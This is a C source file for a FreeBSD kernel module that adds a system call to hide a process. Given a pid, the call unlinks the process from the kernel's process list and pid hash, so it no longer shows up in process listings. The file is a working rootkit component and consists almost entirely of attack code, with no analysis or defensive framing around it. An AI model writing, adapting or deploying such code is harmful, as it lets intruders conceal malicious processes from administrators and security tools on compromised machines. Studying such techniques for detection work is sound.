#include  <sys/types.h>
#include  <sys/param.h>
#include  <sys/proc.h>
#include  <sys/module.h>
#include  <sys/sysent.h>
#include  <sys/kernel.h>
#include  <sys/systm.h>
#include  <sys/queue.h>
#include  <sys/lock.h>
#include  <sys/sx.h>
#include  <sys/mutex.h>
#include <bsm/audit_kevents.h>  /* Necessary to include AUE_NULL */

struct process_args {
    pid_t p_pid;    /* pid of the process to hide */
};

static int process(struct thread *td, void *syscall_args)
{
    struct process_args *args;
    args = (struct process_args *)syscall_args;
    struct proc *p;

    /* Keep the kernel synchronized */
    sx_xlock(&allproc_lock);

    /*
     * This goes through each entry of the p_hash table.  This macro just
     * expands to a for loop.
     */
    LIST_FOREACH(p, PIDHASH(args->p_pid), p_hash)
    {
        /* Compare pid of p to pid that was passed */
        if (p->p_pid == args->p_pid)
        {

            /*
             * Avoid a race condition:
             * http://blog.delphij.net/archives/2007/01/prs-new-check-i.html
             * describes why
             */
            if (p->p_state == PRS_NEW)
            {
                p = NULL;
                break;
            }

            /* Lock the individual process */
            PROC_LOCK(p);

            /* Hide the process */
            LIST_REMOVE(p, p_list);
            LIST_REMOVE(p, p_hash);

            /* Release the lock */
            PROC_UNLOCK(p);
            break;
        }
    }

    /* Release the lock */
    sx_xunlock(&allproc_lock);

    return(0);
}

/* The sysent for the new system call. */
static struct sysent process_sysent = {
    1,
    process
};

/* The offset in sysent[] where the system call is to be allocated. */
static int offset = NO_SYSCALL;

/* The function called at load/unload. */
static int
load(struct module *module, int cmd, void *arg)
{
    int error = 0;
    switch (cmd)
    {
        case MOD_LOAD:
            uprintf("I am syscall %d.\n", offset);
            break;
        case MOD_UNLOAD:
            uprintf("Syscall %d unloaded.\n", offset);
            break;
        default:
            error = EOPNOTSUPP;
            break;
    }
    return(error);
}

SYSCALL_MODULE(process, &offset, &process_sysent, load, NULL);
